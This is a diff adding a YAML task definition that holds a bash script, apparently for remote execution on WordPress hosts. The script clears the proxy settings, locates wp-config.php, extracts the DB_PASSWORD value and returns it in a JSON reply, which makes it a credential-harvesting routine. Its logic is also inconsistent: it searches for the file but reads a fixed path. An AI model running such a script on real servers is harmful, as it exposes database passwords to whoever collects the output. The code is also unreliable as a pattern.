@@ -1,0 +1,29 @@
+execute: remote
+script: |
+  #!/bin/bash
+
+  set -e
+
+  function getParam() {
+   if [ "$1" != "null" ]; then
+       echo $1 | cut -d\" -f 2
+   else
+       echo ""
+   fi
+  }
+
+  export http_proxy=""
+  export https_proxy=""
+
+  principal=$(getParam $1)
+  data=$(getParam $2)
+
+  config=$(find / -name wp-config.php -print -quit)
+  if [ "$config" != "" ]; then
+      pass=$(cat /var/www/html/wp-config.php | grep DB_PASSWORD | cut -d\' -f 4)
+      data="[ \"$pass\" ]"
+  else
+      data="[]"
+  fi
+
+  echo -n "{\"principal\":\"$principal\", \"data\": $data}"
